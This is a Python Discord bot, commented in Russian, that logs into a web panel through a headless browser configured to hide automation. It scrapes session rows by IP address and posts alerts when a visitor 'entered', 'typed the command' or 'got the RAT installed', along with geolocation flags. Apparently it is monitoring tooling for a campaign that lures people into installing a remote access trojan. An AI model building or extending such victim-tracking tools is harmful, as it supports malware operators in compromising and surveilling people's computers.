import discord
from discord.ext import commands, tasks
import asyncio
import time
import re
import os
from datetime import datetime
from bs4 import BeautifulSoup
import requests
from dotenv import load_dotenv
from playwright.async_api import async_playwright

load_dotenv()

# ===== КОНФИГ =====
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
PANEL_URL = "https://hook.today"
CHECK_INTERVAL = 15

# ===== ГЛОБАЛКИ =====
sessions_data = {}
first_run = True
browser = None
context = None
page = None
playwright_instance = None

# ===== КЭШ СТРАН =====
country_cache = {}


def get_country_flag(ip):
    if ip in country_cache:
        return country_cache[ip]
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                code = data.get('countryCode', '').lower()
                flag = f":flag_{code}:" if code else "🌐"
                country_cache[ip] = flag
                return flag
    except:
        pass
    country_cache[ip] = "🌐"
    return "🌐"


# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ PLAYWRIGHT =====
async def init_browser():
    global playwright_instance, browser, context, page

    try:
        print("🔄 Запуск Playwright...")
        playwright_instance = await async_playwright().start()

        browser = await playwright_instance.chromium.launch(
            headless=True,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage'
            ]
        )

        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        )

        page = await context.new_page()

        # Переход на панель
        await page.goto(PANEL_URL, wait_until="domcontentloaded", timeout=60000)
        await page.wait_for_timeout(3000)

        # Проверяем, на странице логина или нет
        if "login" in page.url.lower():
            print("🔐 На странице логина, пробую войти...")
            try:
                await page.fill('input[name="login"]', os.environ.get('PANEL_LOGIN', ''))
                await page.fill('input[name="password"]', os.environ.get('PANEL_PASSWORD', ''))
                await page.click('button[type="submit"]')
                await page.wait_for_timeout(5000)
            except Exception as e:
                print(f"⚠️ Ошибка входа: {e}")
                return False

        # Ждём загрузки страницы
        await page.wait_for_timeout(3000)
        print("✅ Playwright готов")
        return True

    except Exception as e:
        print(f"❌ Ошибка инициализации Playwright: {e}")
        return False


# ===== ПАРСИНГ =====
async def fetch_sessions_async():
    global page

    if not page:
        if not await init_browser():
            return []

    try:
        # Обновляем страницу
        await page.reload()
        await page.wait_for_timeout(3000)

        # Получаем HTML
        html = await page.content()
        soup = BeautifulSoup(html, 'html.parser')

        rows = []
        for row in soup.select('tr'):
            if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', str(row)):
                rows.append(row)

        sessions = []
        for row in rows:
            text = row.get_text()
            ip_match = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text)
            if not ip_match:
                continue
            ip = ip_match.group()

            time_match = re.search(r'\d{2}\.\d{2}\.\d{4}\s+\d{2}:\d{2}:\d{2}', text)
            if not time_match:
                time_match = re.search(r'\d{2}\.\d{2}\.\d{4}\s+\d{2}:\d{2}', text)
            pc_time = time_match.group() if time_match else '—'

            status = 'Зашел'
            if 'ратку' in text.lower() or 'rat' in text.lower():
                status = '🔥 Сел на ратку'
            elif 'команд' in text.lower():
                status = '⌨️ Ввел команду'

            sessions.append({
                'ip': ip,
                'status': status,
                'pc_time': pc_time,
                'rat_installed': 'ратку' in text.lower() or 'rat' in text.lower()
            })

        print(f"📊 Найдено сессий: {len(sessions)}")
        return sessions

    except Exception as e:
        print(f"❌ Ошибка парсинга: {e}")
        return []


def fetch_sessions():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(fetch_sessions_async())
    loop.close()
    return result


# ===== ОТПРАВКА =====
async def send_msg(channel, ip, data):
    flag = get_country_flag(ip)

    status = data.get('status', 'Зашел')
    if 'Ратка' in status:
        color = 0xe74c3c
    elif 'Команда' in status:
        color = 0xf1c40f
    else:
        color = 0x2ecc71

    embed = discord.Embed(
        title=f"{flag} Сессия {ip}",
        color=color,
        timestamp=datetime.now()
    )

    emoji = "🟢"
    if 'Ратка' in status:
        emoji = "🔴"
    elif 'Команда' in status:
        emoji = "🟡"

    embed.add_field(name="Статус", value=f"{emoji} {status}", inline=True)
    embed.add_field(name="Время", value=data.get('pc_time', '—'), inline=True)
    embed.add_field(name="RAT", value="✅ Да" if data.get('rat_installed') else "❌ Нет", inline=True)
    embed.set_footer(text=f"Обновлено: {datetime.now().strftime('%H:%M:%S')}")

    await channel.send(embed=embed)


# ===== МОНИТОРИНГ =====
@tasks.loop(seconds=CHECK_INTERVAL)
async def monitor():
    global sessions_data, first_run

    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        return

    print(f"🔄 Проверка... ({datetime.now().strftime('%H:%M:%S')})")

    sessions = await asyncio.get_event_loop().run_in_executor(None, fetch_sessions)
    if not sessions:
        return

    if first_run:
        for s in sessions:
            sessions_data[s['ip']] = s
        first_run = False
        print(f"✅ Запомнено {len(sessions_data)} сессий")
        return

    for s in sessions:
        ip = s['ip']

        if ip not in sessions_data:
            print(f"🆕 НОВАЯ: {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        old = sessions_data[ip]

        if s.get('pc_time') != old.get('pc_time') and s.get('pc_time') != '—':
            print(f"🔄 ПЕРЕЗАХОД {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        if s.get('status') != old.get('status'):
            print(f"🔄 СТАТУС {ip}: {s.get('status')}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue

        if s.get('rat_installed') and not old.get('rat_installed'):
            print(f"🔥 РАТКА {ip}")
            await send_msg(channel, ip, s)
            sessions_data[ip] = s
            continue


# ===== БОТ =====
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')


@bot.event
async def on_ready():
    global first_run
    print(f"✅ Бот запущен: {bot.user}")
    first_run = True

    # Инициализируем браузер
    if await init_browser():
        monitor.start()
        print("✅ Мониторинг запущен!")


@bot.event
async def on_disconnect():
    global playwright_instance, browser
    if browser:
        await browser.close()
    if playwright_instance:
        await playwright_instance.stop()


if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)